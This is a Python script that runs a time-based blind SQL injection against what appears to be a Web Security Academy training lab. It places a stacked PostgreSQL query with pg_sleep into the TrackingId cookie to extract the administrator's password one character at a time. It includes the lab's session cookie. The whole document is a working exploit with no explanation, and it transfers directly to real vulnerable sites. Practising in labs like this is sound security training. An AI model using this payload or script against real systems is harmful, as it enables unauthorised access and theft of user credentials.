

import requests
import time
import string

# === CONFIG from your lab ===
url = "https://0abb00980448d658817ee4980067001a.web-security-academy.net/"
tracking_id_base = "s9mi3qz6nmWXO5l2"
session_id = "WptKEubK0RUBFYumnwwOp9m7HU7NNikr"
delay_threshold = 8  # seconds to detect delay from pg_sleep(10)

charset = string.ascii_lowercase + string.digits
positions_to_test = list(range(1, 21))  # Test all 20 characters

cookie_template = (
    tracking_id_base +
    "%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,{pos},1)='{char}')+" +
    "THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--"
)

headers = {
    "User-Agent": "Mozilla/5.0"
}

password = {}

print("[*] Starting blind SQLi attack via nohup...\n")

for pos in positions_to_test:
    for char in charset:
        crafted_cookie = cookie_template.format(pos=pos, char=char)
        cookies = {
            "TrackingId": crafted_cookie,
            "session": session_id
        }

        start = time.time()
        requests.get(url, headers=headers, cookies=cookies)
        elapsed = time.time() - start

        if elapsed > delay_threshold:
            password[pos] = char
            print(f"[+] Position {pos}: {char}")
            break

# Build final password string
final_password = ['_'] * 20
for i in range(1, 21):
    final_password[i - 1] = password.get(i, '_')

print("\n✅ DONE! Final password:")
print("".join(final_password))
